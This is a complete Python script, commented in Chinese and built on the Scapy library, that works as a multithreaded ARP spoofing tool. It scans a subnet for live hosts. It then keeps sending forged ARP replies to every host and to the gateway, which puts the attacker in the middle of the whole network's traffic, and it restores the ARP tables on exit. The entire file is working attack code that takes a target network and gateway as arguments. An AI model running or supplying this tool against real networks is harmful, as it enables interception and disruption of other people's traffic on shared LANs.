#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
import argparse
import threading
import os
from scapy.all import ARP, Ether, srp, send, conf
import ipaddress
from collections import defaultdict

# 缓存MAC地址，避免重复查询
mac_cache = {}
# 线程锁，防止多线程写入冲突
print_lock = threading.Lock()
# 存储活跃IP
active_ips = []

def get_mac(ip, interface=None, timeout=1):
    """
    获取指定IP地址的MAC地址，使用缓存提高速度
    """
    global mac_cache
    
    # 如果MAC地址已在缓存中，直接返回
    if ip in mac_cache:
        return mac_cache[ip]
    
    try:
        params = {"pdst": ip}
        if interface:
            params["iface"] = interface
        
        # 减少超时时间提高速度
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(**params), timeout=timeout, verbose=0)
        if ans:
            mac = ans[0][1].hwsrc
            # 缓存结果
            mac_cache[ip] = mac
            return mac
        return None
    except Exception as e:
        with print_lock:
            print(f"[!] 获取MAC地址时出错: {e}")
        return None

def spoof(target_ip, gateway_ip, interface=None):
    """
    向目标发送ARP欺骗包
    """
    try:
        # 获取目标MAC地址
        target_mac = get_mac(target_ip, interface)
        if not target_mac:
            return False
        
        # 获取网关MAC地址（只获取一次并缓存）
        gateway_mac = get_mac(gateway_ip, interface)
        if not gateway_mac:
            return False
        
        # 构造ARP欺骗包 (告诉目标我是网关)
        arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        
        # 发送数据包
        params = {}
        if interface:
            params["iface"] = interface
        send(arp_packet, verbose=0, **params)
        
        # 构造ARP欺骗包 (告诉网关我是目标)
        arp_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
        send(arp_packet, verbose=0, **params)
        
        return True
    except Exception as e:
        with print_lock:
            print(f"[!] ARP欺骗过程中出错: {e}")
        return False

def restore(target_ip, gateway_ip, interface=None):
    """
    恢复网络正常状态
    """
    try:
        target_mac = get_mac(target_ip, interface)
        gateway_mac = get_mac(gateway_ip, interface)
        
        if not target_mac or not gateway_mac:
            return
        
        # 发送正确的ARP信息给目标
        params = {}
        if interface:
            params["iface"] = interface
        
        arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        send(arp_packet, verbose=0, count=5, **params)
        
        # 发送正确的ARP信息给网关
        arp_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
        send(arp_packet, verbose=0, count=5, **params)
    except Exception as e:
        with print_lock:
            print(f"[!] 恢复网络时出错: {e}")

def scan_network(network, interface=None):
    """
    快速扫描网络中的活跃IP
    """
    global active_ips
    
    try:
        network_obj = ipaddress.IPv4Network(network, strict=False)
        with print_lock:
            print(f"[*] 正在扫描网络 {network} 中的活跃设备...")
        
        # 创建ARP请求包
        arp = ARP(pdst=str(network_obj))
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        
        # 发送ARP请求并接收响应
        params = {}
        if interface:
            params["iface"] = interface
        
        result = srp(packet, timeout=3, verbose=0, **params)[0]
        
        # 提取活跃IP
        for sent, received in result:
            active_ips.append(received.psrc)
            mac_cache[received.psrc] = received.hwsrc
        
        with print_lock:
            print(f"[+] 发现 {len(active_ips)} 个活跃设备")
        
        return active_ips
    except Exception as e:
        with print_lock:
            print(f"[!] 扫描网络时出错: {e}")
        return []

def spoof_thread(ip_list, gateway_ip, interface=None, interval=0.5):
    """
    ARP欺骗线程函数
    """
    try:
        while True:
            for ip in ip_list:
                if ip != gateway_ip:
                    result = spoof(ip, gateway_ip, interface)
                    if result:
                        with print_lock:
                            print(f"[+] 已发送ARP欺骗包到 {ip}")
            time.sleep(interval)
    except Exception as e:
        with print_lock:
            print(f"[!] 线程执行出错: {e}")

def attack_network(network, gateway_ip, interface=None, interval=0.5, thread_count=4):
    """
    使用多线程攻击整个网络
    """
    try:
        # 首先扫描网络获取活跃IP
        active_ips = scan_network(network, interface)
        if not active_ips:
            print("[!] 未发现活跃设备，退出")
            return
        
        # 确保网关MAC地址已缓存
        gateway_mac = get_mac(gateway_ip, interface)
        if not gateway_mac:
            print(f"[!] 无法获取网关 {gateway_ip} 的MAC地址，退出")
            return
        
        print(f"[*] 开始攻击网络 {network}，网关: {gateway_ip}")
        
        # 将IP列表分成多个子列表，每个线程处理一部分
        ip_chunks = []
        chunk_size = max(1, len(active_ips) // thread_count)
        for i in range(0, len(active_ips), chunk_size):
            ip_chunks.append(active_ips[i:i + chunk_size])
        
        # 创建并启动多个线程
        threads = []
        for i, ip_chunk in enumerate(ip_chunks):
            t = threading.Thread(
                target=spoof_thread,
                args=(ip_chunk, gateway_ip, interface, interval),
                name=f"Spoofer-{i}"
            )
            t.daemon = True
            threads.append(t)
            t.start()
        
        # 等待用户中断
        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[*] 检测到Ctrl+C，正在恢复网络...")
            # 恢复网络
            for ip in active_ips:
                if ip != gateway_ip:
                    restore(ip, gateway_ip, interface)
            print("[+] ARP表已恢复。退出程序。")
    except Exception as e:
        print(f"[!] 攻击网络时出错: {e}")

def main():
    parser = argparse.ArgumentParser(description="高速ARP欺骗工具")
    parser.add_argument("-n", "--network", required=True, help="要攻击的网络 (CIDR格式，例如: 192.168.1.0/24)")
    parser.add_argument("-g", "--gateway", required=True, help="网关IP地址")
    parser.add_argument("-i", "--interface", help="要使用的网络接口")
    parser.add_argument("-t", "--interval", type=float, default=0.5, help="发送ARP包的间隔时间(秒)")
    parser.add_argument("-c", "--threads", type=int, default=4, help="使用的线程数")
    
    args = parser.parse_args()
    
    # 禁用Scapy警告
    conf.verb = 0
    
    try:
        attack_network(args.network, args.gateway, args.interface, args.interval, args.threads)
    except KeyboardInterrupt:
        print("\n[*] 用户中断。退出程序。")
    except Exception as e:
        print(f"[!] 发生错误: {e}")

if __name__ == "__main__":
    # 检查是否以管理员权限运行
    if sys.platform.startswith('win'):
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("[!] 此脚本需要管理员权限运行")
            print("[!] 请以管理员身份重新运行此脚本")
            sys.exit(1)
    else:
        import os
        if os.geteuid() != 0:
            print("[!] 此脚本需要root权限运行")
            print("[!] 请使用sudo重新运行此脚本")
            sys.exit(1)
    
    main()